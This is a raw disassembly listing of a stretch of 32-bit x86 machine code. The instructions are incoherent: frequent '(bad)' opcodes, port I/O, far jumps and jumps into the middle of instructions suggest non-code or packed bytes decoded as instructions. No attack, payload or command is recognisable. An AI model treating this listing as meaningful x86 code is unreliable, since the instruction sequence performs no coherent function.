  51526d:	cmp    DWORD PTR [edx-0x2daa0629],0xd
  515274:	add    cl,BYTE PTR [ebp+0x67ea11fe]
  51527a:	sbb    eax,0x96efeecc
  51527f:	adc    ah,BYTE PTR [eax+0x15b2a4a8]
  515285:	test   BYTE PTR [ebx],dh
  515287:	pop    ecx
  515288:	or     al,0x6a
  51528a:	cs jae 0x5152aa
  51528d:	add    eax,0x452b3a79
  515292:	cmp    eax,0xde16ff67
  515297:	es push ds
  515299:	pop    esp
  51529a:	mov    dh,0xba
  51529c:	sbb    eax,0xb76673e1
  5152a1:	add    al,0xbf
  5152a3:	and    al,0x4c
  5152a5:	xor    BYTE PTR ds:0x4bf26cf5,al
  5152ab:	into   
  5152ac:	sub    DWORD PTR [esi-0x73],edx
  5152af:	pop    ss
  5152b0:	lahf   
  5152b1:	cmc    
  5152b2:	xor    bl,BYTE PTR [ebp+0x172b1bf6]
  5152b8:	cdq    
  5152b9:	(bad)  
  5152ba:	popa   
  5152bb:	push   0x87f4b11f
  5152c0:	sub    ebp,DWORD PTR [ecx-0x31]
  5152c3:	adc    DWORD PTR [ebp+0x3d30e402],edx
  5152c9:	aad    0x89
  5152cb:	add    DWORD PTR [ebp+0x6c],0x4d33d35a
  5152d2:	sar    DWORD PTR [ecx],0xae
  5152d5:	mov    ?,WORD PTR [ecx+0x7d]
  5152d8:	sbb    BYTE PTR [esi],0xbc
  5152db:	mov    DWORD PTR [eax-0x72],edi
  5152de:	mov    ecx,0x19d20bc7
  5152e3:	mov    es,WORD PTR [edi+0x29a1712c]
  5152e9:	xchg   edi,eax
  5152ea:	mov    bl,0x6b
  5152ec:	aam    0x25
  5152ee:	push   ebp
  5152ef:	int3   
  5152f0:	sub    DWORD PTR [ecx-0x32ff93c4],eax
  5152f6:	xor    al,BYTE PTR [eax+0x175f3db8]
  5152fc:	mov    ebp,0x315d68aa
  515301:	lods   eax,DWORD PTR ds:[esi]
  515302:	inc    edi
  515303:	popa   
  515304:	in     al,dx
  515305:	add    DWORD PTR [edx+0x3c],0xd5189cdf
  51530c:	pop    ds
  51530d:	sti    
  51530e:	mov    ebp,0x8d578d3a
  515313:	pop    DWORD PTR [esi-0x3a16c901]
  515319:	jo     0x5152d0
  51531b:	(bad)  
  51531d:	sar    BYTE PTR [ecx],cl
  51531f:	add    cl,BYTE PTR ds:0x9bbbd484
  515325:	icebp  
  515326:	inc    esi
  515327:	inc    edi
  515328:	add    eax,DWORD PTR [ebx+0x399cf422]
  51532e:	add    BYTE PTR [ecx],dh
  515330:	not    cl
  515332:	aas    
  515333:	mov    cl,0x70
  515335:	or     BYTE PTR [edx],bh
  515337:	lds    ebx,FWORD PTR [ebx]
  515339:	(bad)
  51533d:	bound  edx,QWORD PTR [ebp-0x1d66138]
  515343:	int3   
  515344:	xchg   esi,eax
  515345:	mov    ecx,0xd87410d0
  51534a:	mov    ebx,0x39948cf9
  51534f:	fsubr  DWORD PTR ds:0x3ffc9c59
  515355:	call   0xb756:0x38810654
  51535c:	push   edi
  51535d:	sub    BYTE PTR [eax+0x592a0258],cl
  515363:	add    ecx,DWORD PTR [esi]
  515365:	jne    0x51532a
  515367:	sub    al,0x5
  515369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51536a:	xor    eax,0x77c67680
  51536f:	aas    
  515370:	dec    edi
  515371:	inc    ebp
  515372:	aaa    
  515373:	dec    ebx
  515374:	and    DWORD PTR [esi],ebx
  515376:	jmp    0x515374
  515378:	sbb    edx,DWORD PTR [eax]
  51537a:	push   cs
  51537b:	rcr    BYTE PTR [eax],cl
  51537d:	(bad)  
  51537e:	fidivr DWORD PTR [edx+0x72e0617d]
  515384:	pop    ebx
  515385:	sbb    edi,esp
  515387:	mov    bl,BYTE PTR [edi-0x25aaa75a]
  51538d:	push   es
  51538e:	dec    esi
  51538f:	inc    eax
  515390:	sbb    BYTE PTR [ebp-0x5c],al
  515393:	dec    eax
  515394:	jae    0x515333
  515396:	loope  0x51533e
  515398:	retf   
  515399:	fisub  WORD PTR [eax]
  51539b:	mov    eax,ds:0x365ba348
  5153a0:	xlat   BYTE PTR ds:[ebx]
  5153a1:	cmp    al,0xa7
  5153a3:	jae    0x51535f
  5153a5:	fstp   DWORD PTR [ecx+esi*4+0xd]
  5153a9:	mov    bl,0xe0
  5153ab:	gs dec edx
  5153ad:	cmp    DWORD PTR [eax],0x1
  5153b0:	sbb    bl,BYTE PTR [ebp+edi*4-0x75]
  5153b4:	cmp    esi,eax
  5153b6:	into   
  5153b7:	test   eax,0xabfc9be6
  5153bc:	jns    0x5153aa
  5153be:	jnp    0x5153e8
  5153c0:	loop   0x515407
  5153c2:	cmp    ecx,ebx
  5153c4:	and    DWORD PTR [ecx+0x40],ebx
  5153c7:	pushf  
  5153c8:	int    0x67
  5153ca:	mov    bl,0x2
  5153cc:	jne    0x51544b
  5153ce:	jno    0x51536c
  5153d0:	out    dx,al
  5153d1:	stos   BYTE PTR es:[edi],al
  5153d2:	jbe    0x515396
  5153d4:	dec    edi
  5153d5:	xlat   BYTE PTR ds:[ebx]
  5153d6:	inc    esp
  5153d7:	shl    edi,cl
  5153d9:	aas    
  5153da:	js     0x515434
  5153dc:	sbb    edi,DWORD PTR [ebp+eax*2+0x1e]
  5153e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5153e1:	mov    dh,0xda
  5153e3:	push   cs
  5153e4:	(bad)  
  5153e5:	ja     0x515374
  5153e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5153e8:	adc    ch,BYTE PTR [ebx-0x7de21afc]
  5153ee:	popf   
  5153ef:	add    dh,0xba
  5153f2:	enter  0x3a9,0x15
  5153f6:	dec    ebp
  5153f7:	push   esi
  5153f8:	and    DWORD PTR [ebx*8+0xb01293a],0xffffffaa
  515400:	mov    edx,0xb6da3b47
  515405:	adc    dh,BYTE PTR [ebp+edx*8+0x45]
  515409:	stc    
  51540a:	cli    
  51540b:	pop    ecx
  51540c:	outs   dx,BYTE PTR ds:[esi]
  51540d:	enter  0x39dd,0x8f
  515411:	xchg   esp,eax
  515412:	std    
  515413:	cdq    
  515414:	mov    ebp,0x70503ddb
  515419:	dec    ebx
  51541a:	fdiv   QWORD PTR ds:0xf586d2e6
  515420:	push   ss
  515421:	or     al,BYTE PTR [ebx+0x2f10a574]
  515427:	loopne 0x5153b8
  515429:	dec    esi
  51542a:	jmp    0x1321:0xaff976f3
  515431:	out    0xe4,eax
  515433:	xchg   edi,eax
  515434:	retf   0x5a5c
  515437:	call   0xe818:0xd3a5a87c
  51543e:	adc    DWORD PTR [esi],0xe95af62c
  515444:	aas    
  515445:	cmp    eax,DWORD PTR ds:0xb6993da7
  51544b:	and    BYTE PTR [ecx-0x44b9b4c1],bl
  515451:	xchg   ebx,eax
  515452:	aaa    
  515453:	mov    ah,BYTE PTR [esi-0x7640e308]
  515459:	push   eax
  51545a:	js     0x5154ce
  51545c:	ss add al,0xd1
  51545f:	sbb    BYTE PTR [ebp+0x2f],bl
  515462:	inc    ebp
  515463:	pusha  
  515464:	xchg   edx,eax
  515465:	jp     0x515441
  515467:	cmc    
  515468:	inc    edi
  515469:	push   ss
  51546a:	lea    ecx,cs:[eax]
  51546d:	sahf   
  51546e:	mov    esp,0xac1e0302
  515473:	ds sbb al,0x54
  515476:	aam    0x1d
  515478:	mov    ebx,eax
  51547a:	xor    al,0x16
  51547c:	ret    0x7742
  51547f:	pushf  
  515480:	retf   
  515481:	(bad)  
  515482:	mov    esi,0x9791e2d6
  515487:	js     0x5154cc
  515489:	jle    0x515456
  51548b:	scas   al,BYTE PTR es:[edi]
  51548c:	add    ecx,DWORD PTR [edi+ecx*8-0x36]
  515490:	fdivr  QWORD PTR [esi-0x1f]
  515493:	or     al,0xc
  515495:	add    DWORD PTR [ebx-0x56c28f68],ebx
  51549b:	lds    ecx,FWORD PTR [esi-0x2109026c]
  5154a1:	inc    ecx
  5154a2:	sub    DWORD PTR [edx-0x73],esp
  5154a5:	out    dx,eax
  5154a6:	(bad)  
  5154a7:	lock in al,dx
  5154a9:	cs push edi
  5154ab:	jg     0x5154e0
  5154ad:	in     eax,0x68
  5154af:	sbb    DWORD PTR [ebx+0x2e],0x30
  5154b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5154b4:	or     BYTE PTR [ecx],cl
  5154b6:	pop    edi
  5154b7:	mov    gs,WORD PTR [eax]
  5154b9:	jg     0x515498
  5154bb:	in     al,0x49
  5154bd:	dec    ebx
  5154be:	sbb    esp,DWORD PTR [ecx-0x37a694ba]
  5154c4:	push   cs
  5154c5:	or     eax,0x452bb182
  5154ca:	outs   dx,BYTE PTR ds:[esi]
  5154cb:	mov    cl,0x12
  5154cd:	sbb    eax,DWORD PTR [ebx+0x39384c3c]
  5154d3:	push   esp
  5154d4:	mov    edx,0x48f66756
  5154d9:	push   edi
  5154da:	hlt    
  5154db:	and    al,0xb8
  5154dd:	xor    dh,BYTE PTR [ecx-0x2388abf5]
  5154e3:	xchg   ebx,eax
  5154e4:	sub    ebx,DWORD PTR [ecx]
  5154e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5154e7:	xor    al,0x44
  5154e9:	mov    ds:0xc41836a3,eax
  5154ee:	jae    0x515479
  5154f0:	adc    eax,0x8eb6aff
  5154f5:	jl     0x515513
  5154f7:	mov    dl,BYTE PTR [ecx]
  5154f9:	out    dx,eax
  5154fa:	mov    cl,0xee
  5154fc:	xor    eax,DWORD PTR [esi-0x7d39492a]
  515502:	cmp    al,0x76
  515504:	sti    
  515505:	loop   0x5154ef
  515507:	jbe    0x51552c
  515509:	xor    BYTE PTR [eax+eiz*1-0x34e78784],cl
  515510:	sbb    dl,dh
  515512:	xchg   DWORD PTR [ebx-0x7fd80b11],esi
  515518:	xchg   ebx,eax
  515519:	sti    
  51551a:	add    eax,0x2c9c2e2a
  51551f:	ds mov eax,0xe62a7fc8
  515525:	dec    esp
  515526:	pop    esi
  515527:	or     eax,0xcd289288
  51552c:	mov    eax,ecx
  51552e:	xchg   esp,eax
  51552f:	mov    ds:0x2bc4a56b,al
  515534:	sub    al,0x93
  515536:	ds in  al,0x8c
  515539:	and    bl,BYTE PTR [edi-0x6a]
  51553c:	push   edi
  51553d:	add    eax,0x8aa89f9a
  515542:	sbb    al,0x9d
  515544:	(bad)  
  515545:	pop    es
  515546:	jge    0x5155b7
  515548:	loopne 0x5154f3
  51554a:	or     al,0x63
  51554c:	imul   ebp,DWORD PTR [eax-0x558602db],0x26
  515553:	int    0xcb
  515555:	add    ebp,eax
  515557:	das    
  515558:	test   al,0x4
  51555a:	into   
  51555b:	adc    ebp,DWORD PTR [eax]
  51555d:	xlat   BYTE PTR ds:[ebx]
  51555e:	ins    DWORD PTR es:[edi],dx
  51555f:	xor    bh,BYTE PTR [ecx+0x74ef188c]
  515565:	in     al,dx
  515566:	xor    eax,0xa9e8ae11
  51556b:	adc    edx,edx
  51556d:	retf   
  51556e:	lock push ebp
  515570:	call   FWORD PTR [eax-0x6eae266b]
  515576:	popf   
  515577:	repnz xchg edx,eax
  515579:	pop    ds
  51557a:	mov    WORD PTR [ecx-0x45c853e0],es
  515580:	stos   DWORD PTR es:[edi],eax
  515581:	mov    al,ds:0x51cfbeb3
  515586:	jbe    0x5155d3
  515588:	fist   WORD PTR [ecx-0x1e135cc9]
  51558e:	(bad)  
  51558f:	gs cmp eax,0x3e3a30f7
  515595:	iret   
  515596:	int3   
  515597:	adc    al,0x6f
  515599:	aam    0x17
  51559b:	xchg   esi,eax
  51559c:	ins    DWORD PTR es:[edi],dx
  51559d:	(bad)  
  51559e:	fmul   QWORD PTR [ecx-0x43]
  5155a1:	add    DWORD PTR [ebp+0x62],ebp
  5155a4:	dec    esi
  5155a5:	jl     0x51556c
  5155a7:	loope  0x5155f5
  5155a9:	js     0x515554
  5155ab:	cmp    dl,ch
  5155ad:	(bad)  
  5155ae:	mov    eax,0x7841684d
  5155b3:	or     cl,BYTE PTR [eax+0x74]
  5155b6:	std    
  5155b7:	xchg   ecx,eax
  5155b8:	add    eax,0x63020c71
  5155bd:	push   esi
  5155be:	add    ecx,ecx
  5155c0:	jg     0x5155a7
  5155c2:	mov    DWORD PTR [ecx-0x75c91a89],ebx
  5155c8:	(bad)  
  5155ca:	data16 lods al,BYTE PTR ds:[esi]
  5155cc:	(bad)  
  5155ce:	mov    eax,0x4b207b77
  5155d3:	pop    edx
  5155d4:	call   0xc6d6d602
  5155d9:	pop    ebp
  5155da:	or     edx,DWORD PTR [ebx-0x663c905b]
  5155e0:	hlt    
  5155e1:	jbe    0x515563
  5155e3:	xor    al,0xdf
  5155e5:	imul   esi,ecx,0xffffff96
  5155e8:	ror    dh,0x1a
  5155eb:	cmp    ebx,edi
  5155ed:	nop
  5155ee:	jo     0x5155ef
  5155f0:	pop    ss
  5155f1:	imul   eax,ebp,0xffffffbd
  5155f4:	push   edi
  5155f5:	fstp   QWORD PTR [eax-0x3a]
  5155f8:	dec    esi
  5155f9:	call   0xd66d4ffd
  5155fe:	lods   al,BYTE PTR ds:[esi]
  5155ff:	leave  
  515600:	iret   
  515601:	js     0x5155c5
  515603:	(bad)  
  515604:	aaa    
  515605:	mov    ecx,0x2946e844
  51560a:	adc    BYTE PTR [edi],bl
  51560c:	enter  0x964c,0x2a
  515610:	inc    ecx
  515611:	fild   QWORD PTR [edx]
  515613:	pop    ebp
  515614:	div    ecx
  515616:	pop    ecx
  515617:	mov    bl,0x9f
  515619:	stos   DWORD PTR es:[edi],eax
  51561a:	sbb    al,bh
  51561c:	je     0x5155a8
  51561e:	and    ecx,DWORD PTR [ebx]
  515620:	dec    ebp
  515621:	gs (bad) 
  515623:	xchg   ebx,eax
  515624:	scas   eax,DWORD PTR es:[edi]
  515625:	ss in  al,0xef
  515628:	(bad)  
  515629:	xchg   ecx,eax
  51562a:	fild   DWORD PTR [edx-0x83e54]
  515630:	arpl   WORD PTR [ebx-0x1b],cx
  515633:	and    esp,esi
  515635:	fcomp  st(4)
  515637:	leave  
  515638:	xor    BYTE PTR [ecx+0x74828d65],0xa5
  51563f:	jae    0x5155ed
  515641:	ret    0xd797
  515644:	in     al,dx
  515645:	and    dh,BYTE PTR [edx-0x5f]
  515648:	daa    
  515649:	(bad)  
  51564a:	pop    edx
  51564b:	mov    cl,al
  51564d:	sbb    BYTE PTR ds:[ebx-0x772d24be],ch
  515654:	test   BYTE PTR [edx+0x341ee265],al
  51565a:	test   eax,0x394d8d35
  51565f:	fs loop 0x515645
  515662:	jns    0x515685
  515664:	xor    al,BYTE PTR [edx+0x3118a540]
  51566a:	and    esp,DWORD PTR [ebx+0x69]
  51566d:	adc    BYTE PTR ds:0x86a5c001,0x84
  515674:	outs   dx,BYTE PTR ds:[esi]
  515675:	loope  0x5156ad
  515677:	cmp    eax,0x100f02cd
  51567c:	xor    DWORD PTR [edi],eax
  51567e:	inc    edi
  51567f:	je     0x515629
  515681:	and    BYTE PTR [ebp+0x1d],dh
  515684:	cmp    BYTE PTR [eax-0x2c1c754e],dl
  51568a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51568b:	test   eax,0x82ff78a2
  515690:	cmp    eax,0xe5d9b3bf
  515695:	icebp  
  515696:	fdivr  DWORD PTR [ebx]
  515698:	jmp    0x1f55:0x20d501cc
  51569f:	jbe    0x51567d
  5156a1:	in     al,dx
  5156a2:	sbb    ch,dl
  5156a4:	pop    ds
  5156a5:	(bad)  
  5156a6:	sub    al,0xa7
  5156a8:	aas    
  5156a9:	inc    edx
  5156aa:	ret    
  5156ab:	sbb    ebx,DWORD PTR [ecx-0x2cdcde81]
  5156b1:	into   
  5156b2:	add    BYTE PTR ds:[edi],0x58
  5156b6:	outs   dx,DWORD PTR ds:[esi]
  5156b7:	test   DWORD PTR [esi],edx
  5156b9:	and    eax,0x73fcd868
  5156be:	mov    ch,0x0
  5156c0:	and    al,0x7e
  5156c2:	in     al,dx
  5156c3:	dec    ebp
  5156c4:	and    al,0x75
  5156c6:	inc    esi
  5156c7:	ss stos BYTE PTR es:[edi],al
  5156c9:	outs   dx,BYTE PTR ds:[esi]
  5156ca:	push   esp
  5156cb:	es (bad) 
  5156ce:	aad    0xd4
  5156d0:	pop    edx
  5156d1:	loope  0x51570b
  5156d3:	aad    0x4e
  5156d5:	inc    eax
  5156d6:	aam    0xb
  5156d8:	mov    esi,gs
  5156da:	push   ebx
  5156db:	jecxz  0x515694
  5156dd:	gs push eax
  5156df:	cmp    esi,edx
  5156e1:	adc    dh,BYTE PTR [edx-0xf]
  5156e4:	adc    eax,0xe86d66f9
  5156e9:	inc    ebp
  5156ea:	cmp    dl,BYTE PTR [eax]
  5156ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5156ed:	inc    ebp
  5156ee:	dec    esi
  5156ef:	add    BYTE PTR [eax],cl
  5156f1:	jg     0x515752
  5156f3:	jp     0x51567c
  5156f5:	cld    
  5156f6:	(bad)  
  5156f8:	jge    0x51574e
  5156fa:	not    BYTE PTR [ecx-0x39bc9a47]
  515700:	lahf   
  515701:	pop    ds
  515702:	cmp    eax,DWORD PTR [ebp-0x45]
  515705:	(bad)  
  515707:	outs   dx,BYTE PTR ds:[esi]
  515708:	and    edi,DWORD PTR [edx+eax*8-0x49]
  51570c:	imul   edx,ebx,0xe
  51570f:	inc    edi
  515710:	repnz jmp 0x5ca4:0x68a45a71
  515718:	jns    0x515771
  51571a:	pop    esi
  51571b:	data16 in al,0x86
  51571e:	js     0x51572d
  515720:	push   es
  515721:	mov    al,ds:0xb71e3a8c
  515726:	stc    
  515727:	stos   DWORD PTR es:[edi],eax
  515728:	push   0x2adda22
  51572d:	cs dec ecx
  51572f:	jge    0x5156cf
  515731:	out    0x7c,al
  515733:	neg    bl
  515735:	enter  0x94e3,0xf0
  515739:	rcr    BYTE PTR [edi-0x1de5cdb8],1
  51573f:	cli    
  515740:	je     0x515782
  515742:	add    DWORD PTR [ecx-0xb65a9cd],eax
  515748:	out    dx,eax
  515749:	mov    dl,0xd4
  51574b:	xchg   esi,eax
  51574c:	ret    0x3a62
  51574f:	sub    dl,al
  515751:	dec    eax
  515752:	inc    eax
  515753:	sar    DWORD PTR [edi],1
  515755:	outs   dx,BYTE PTR ds:[esi]
  515756:	cmp    al,0xe4
  515758:	push   eax
  515759:	repnz es aam 0xc9
  51575d:	ja     0x515717
  51575f:	jns    0x51570c
  515761:	outs   dx,BYTE PTR ds:[esi]
  515762:	inc    esp
  515763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  515764:	sti    
  515765:	sbb    al,0xa6
  515767:	xchg   edi,eax
  515768:	jo     0x515771
  51576a:	sub    edi,DWORD PTR [eax+0x6f1058d0]
  515770:	inc    esi
  515771:	cld    
  515772:	leave  
  515773:	or     ch,BYTE PTR [edx-0x64]
  515776:	dec    esp
  515777:	jbe    0x515736
  515779:	mov    eax,ds:0x5504ad70
  51577e:	popa   
  51577f:	fld    TBYTE PTR [edi+0x63e50e39]
  515785:	icebp  
  515786:	mov    ds:0xab3ec9db,eax
  51578b:	mov    esi,0xe90d89f0
  515790:	sub    eax,0x3ad001d1
  515795:	mov    ds:0x42ae75dd,al
  51579a:	inc    edi
  51579b:	arpl   WORD PTR [edx-0x3237f0bd],cx
  5157a1:	shr    DWORD PTR ds:[esi+eiz*8],cl
  5157a5:	ins    DWORD PTR es:[edi],dx
  5157a6:	mov    edx,0x14444054
  5157ab:	sahf   
  5157ac:	das    
  5157ad:	or     eax,0x6dbf3020
  5157b2:	xor    BYTE PTR [ebx+0x1b1eab2a],al
  5157b8:	jmp    0x5157cb
  5157ba:	mov    eax,?
  5157bc:	add    DWORD PTR [edx],edi
  5157be:	shl    BYTE PTR [eax+0x6b37ee76],0xee
  5157c5:	repnz inc eax
  5157c7:	inc    ecx
  5157c8:	not    DWORD PTR [edi]
  5157ca:	or     eax,0x7540ed33
  5157cf:	das    
  5157d0:	pushf  
  5157d1:	add    ah,BYTE PTR [edx-0x7b]
  5157d4:	ja     0x515828
  5157d6:	xchg   ebp,eax
  5157d7:	jecxz  0x51576a
  5157d9:	fldcw  WORD PTR [ebx-0x5a9c36b9]
  5157df:	pop    edi
  5157e0:	enter  0xd57,0x21
  5157e4:	sub    DWORD PTR [esi-0x15],eax
  5157e7:	mov    bl,0x92
  5157e9:	out    dx,al
  5157ea:	add    edx,DWORD PTR [ebx]
  5157ec:	sbb    esi,edx
  5157ee:	ds pop es
  5157f0:	mov    ds:0xcd9edb7a,al
  5157f5:	xchg   ebp,eax
  5157f6:	xlat   BYTE PTR ds:[ebx]
  5157f7:	(bad)  
  5157f8:	lods   al,BYTE PTR ds:[esi]
  5157f9:	push   ecx
  5157fa:	mov    bh,0x1e
  5157fc:	cli    
  5157fd:	or     al,0x36
  5157ff:	and    al,0x9
  515801:	mov    dl,0x6d
  515803:	jp     0x5157f6
  515805:	mov    BYTE PTR [ebx+0x47],bh
  515808:	rcl    ah,0x2a
  51580b:	popf   
  51580c:	push   ebx
  51580d:	add    eax,0x4d67b8ed
  515812:	lds    ebp,FWORD PTR [ecx+0x2078588]
  515818:	pop    ds
  515819:	jl     0x5157b3
  51581b:	inc    esi
  51581c:	loope  0x51586b
  51581e:	mov    DWORD PTR [ecx+0x58],eax
  515821:	stos   DWORD PTR es:[edi],eax
  515822:	in     eax,0x66
  515824:	test   DWORD PTR [ecx+0x7584a5f0],ebp
  51582a:	clc    
  51582b:	leave  
  51582c:	push   esi
  51582d:	js     0x5157e6
  51582f:	in     eax,0x64
  515831:	lods   al,BYTE PTR ds:[esi]
  515832:	push   eax
  515833:	push   ss
  515834:	adc    eax,DWORD PTR ds:0x402bf38f
  51583a:	cmp    edi,0xc5e8a811
  515840:	xor    al,0x55
  515842:	nop
  515843:	sub    DWORD PTR [esi-0x14],0xe984565a
  51584a:	pop    ecx
  51584b:	mov    al,ds:0xc7e28cf4
  515850:	xor    DWORD PTR [eax+0x38a8f80c],0x27
  515857:	sub    BYTE PTR [edx],dl
  515859:	in     eax,dx
  51585a:	ds loopne 0x5158b3
  51585d:	push   edi
  51585e:	rcr    DWORD PTR [edx+0x39],1
  515861:	xor    BYTE PTR [ebx+0x392a2397],0x6a
  515868:	dec    BYTE PTR [edi]
  51586a:	(bad)  
  51586b:	mov    dh,0xde
  51586d:	add    DWORD PTR [ebp+esi*8+0xc189ea8],0xcab2dbf
  515878:	and    ebx,esi
  51587a:	mov    esp,0xb6c91206
  51587f:	or     BYTE PTR [esi+0x26b973c9],cl
  515885:	pop    eax
  515886:	clc    
  515887:	ja     0x5158cd
  515889:	push   ebp
  51588a:	fsubr  QWORD PTR ds:0x2a9425ab
  515890:	ins    DWORD PTR es:[edi],dx
  515891:	adc    eax,0x5dae5037
  515896:	in     al,dx
  515897:	into   
  515898:	movaps xmm1,XMMWORD PTR [ecx+0x35]
  51589c:	in     al,dx
  51589d:	and    DWORD PTR [eax],ecx
  51589f:	and    ecx,ebp
  5158a1:	in     al,dx
  5158a2:	mov    edi,DWORD PTR [ebx+0x67]
  5158a5:	fs aaa 
  5158a7:	pop    es
  5158a8:	shr    bl,cl
  5158aa:	lahf   
  5158ab:	adc    ebp,DWORD PTR ds:0x73c85367
  5158b1:	and    esi,ebx
  5158b3:	jp     0x515914
  5158b5:	and    al,BYTE PTR [edx+0x37]
  5158b8:	and    DWORD PTR [edi-0x2f35f289],ecx
  5158be:	test   DWORD PTR [ebx-0x38],eax
  5158c1:	jae    0x51584f
  5158c3:	dec    eax
  5158c4:	jle    0x5158ee
  5158c6:	scas   al,BYTE PTR es:[edi]
  5158c7:	out    dx,al
  5158c8:	inc    esp
  5158c9:	outs   dx,DWORD PTR ds:[esi]
  5158ca:	mov    WORD PTR [esi],?
  5158cc:	add    ebx,esi
  5158ce:	jne    0x5158cc
  5158d0:	adc    bl,dl
  5158d2:	or     al,0x83
  5158d4:	push   edi
  5158d5:	rol    bh,1
  5158d7:	sbb    BYTE PTR ds:0x76fce08a,ah
  5158dd:	ins    BYTE PTR es:[edi],dx
  5158de:	pop    esp
  5158df:	cs jb  0x5158e4
  5158e2:	aad    0xa3
  5158e4:	mov    BYTE PTR [ecx+0x3d],bh
  5158e7:	nop
  5158e8:	or     eax,0x9019c872
  5158ed:	mov    ebp,esi
  5158ef:	sub    esi,edx
  5158f1:	push   ecx
  5158f2:	cld    
  5158f3:	xchg   esi,eax
  5158f4:	cmp    DWORD PTR [esi+0x6cae32e9],0xf63901c2
  5158fe:	fcmovnbe st,st(4)
  515900:	sbb    dl,BYTE PTR [edx+ecx*1+0x40]
  515904:	int3   
  515905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  515906:	mov    bh,0xc9
  515908:	aad    0x5b
  51590a:	jmp    0x55a7c036
  51590f:	stos   DWORD PTR es:[edi],eax
  515910:	add    DWORD PTR ds:0xb349a6c5,esi
  515916:	mov    ebp,edx
  515918:	push   0x27cab66
  51591d:	retf   0x3134
  515920:	test   eax,0xa1c24b6c
  515925:	dec    ebp
  515926:	jnp    0x5158e5
  515928:	fmul   DWORD PTR [ecx-0x603ebad3]
  51592e:	adc    BYTE PTR [edx+0x5b],0xaa
  515932:	cmp    al,0x15
  515934:	ins    BYTE PTR es:[edi],dx
  515935:	scas   eax,DWORD PTR es:[edi]
  515936:	xor    esp,ebp
  515938:	aam    0xaf
  51593a:	outs   dx,DWORD PTR ds:[esi]
  51593b:	mov    al,ds:0xee5e1a51
  515940:	mov    edx,DWORD PTR [edi]
  515942:	push   0x38525d95
  515947:	push   edx
  515948:	and    BYTE PTR [edi+eiz*1+0x5f],cl
  51594c:	dec    edx
  51594d:	xchg   ebp,eax
  51594e:	into   
  51594f:	daa    
  515950:	cs dec eax
  515952:	mov    ds:0xa8cf4b7e,al
  515957:	pop    ss
  515958:	arpl   ax,dx
  51595a:	cmp    eax,0x1ec4a36
  51595f:	clc    
  515960:	sbb    DWORD PTR [esp+eax*2],ebx
  515963:	cmp    al,bh
  515965:	test   cl,bl
  515967:	sbb    eax,0x5badd05f
  51596c:	retf   
  51596d:	(bad)  
  51596e:	sub    al,0x50
  515970:	sub    DWORD PTR [edi],eax
  515972:	push   edx
  515973:	jmp    0xc8b7:0xba28f450
  51597a:	aam    0x38
  51597c:	dec    edi
  51597d:	dec    ecx
  51597e:	jnp    0x515926
  515980:	sub    eax,0x9f9e4fa2
  515985:	jg     0x51596e
  515987:	lock inc ebp
  515989:	mov    ebx,0x182b5ea1
  51598e:	jle    0x515933
  515990:	cmp    eax,0x97b2619e
  515995:	dec    edx
  515996:	repz xor dh,BYTE PTR [edi+0x5]
  51599a:	jno    0x515965
  51599c:	cmp    DWORD PTR [esp+eax*4],edx
  51599f:	(bad)  
  5159a0:	jge    0x51597d
  5159a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5159a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5159a4:	or     BYTE PTR [ebx+ecx*2],bl
  5159a7:	cmp    DWORD PTR [eax+0xf],ebp
  5159aa:	mov    eax,0x5a4a8830
  5159af:	xor    al,0x75
  5159b1:	fs xchg edi,eax
  5159b3:	das    
  5159b4:	pushf  
  5159b5:	iret   
  5159b6:	push   es
  5159b7:	mov    esp,0xd853d62
  5159bc:	into   
  5159bd:	inc    eax
  5159be:	cdq    
  5159bf:	cmp    ecx,edx
  5159c1:	dec    eax
  5159c2:	int    0x56
  5159c4:	cdq    
  5159c5:	(bad)  
  5159c6:	jmp    0x5159ad
  5159c8:	scas   al,BYTE PTR es:[edi]
  5159c9:	push   eax
  5159ca:	xor    esp,DWORD PTR [esi+0x1c]
  5159cd:	addr16 nop
  5159cf:	cmp    al,BYTE PTR [eax-0x28]
  5159d2:	mov    ebx,0x927a6e62
  5159d7:	dec    ecx
  5159d8:	sahf   
  5159d9:	(bad)  
  5159da:	adc    esi,DWORD PTR [edx-0x45]
  5159dd:	xchg   BYTE PTR [ebx+esi*1],ah
  5159e0:	dec    esi
  5159e1:	scas   al,BYTE PTR es:[edi]
  5159e2:	lea    ecx,[edx]
  5159e4:	into   
  5159e5:	adc    BYTE PTR [esi],al
  5159e7:	out    0xb8,al
  5159e9:	mov    ecx,0x1cfb032f
  5159ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5159ef:	xor    al,0xfe
  5159f1:	rcl    DWORD PTR [ebx],0x7b
  5159f4:	or     bh,BYTE PTR [edi]
  5159f6:	mov    ecx,DWORD PTR [edx-0x7cee2a60]
  5159fc:	inc    edx
  5159fd:	cmp    bl,dh
  5159ff:	mov    ds:0x31554606,al
  515a04:	test   esi,0xfb2a43fa
  515a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  515a0b:	xchg   esp,eax
  515a0c:	and    BYTE PTR [esi-0x2800f756],0x4d
  515a13:	out    0x57,al
  515a15:	es inc eax
  515a17:	loope  0x5159c0
  515a19:	push   0x6949ee0f
  515a1e:	dec    ebp
  515a1f:	inc    edx
  515a20:	stos   DWORD PTR es:[di],eax
  515a22:	mov    ?,WORD PTR [ebp+0x33f07710]
  515a28:	jns    0x5159dc
  515a2a:	mov    ah,0xd
  515a2c:	sbb    eax,0xecfddf51
  515a31:	mov    dh,0x4c
  515a33:	sar    ebx,1
  515a35:	inc    edi
  515a36:	sbb    al,BYTE PTR [ebx]
  515a38:	jg     0x515a26
  515a3a:	jge    0x515a04
  515a3c:	add    al,0x5c
  515a3e:	ss lahf 
  515a40:	dec    eax
  515a41:	jae    0x515a00
  515a43:	add    eax,0x809dce2b
  515a48:	aad    0x2a
  515a4a:	aad    0xaa
  515a4c:	inc    ebp
  515a4d:	call   0x92dfd65
  515a52:	ret    0x14a5
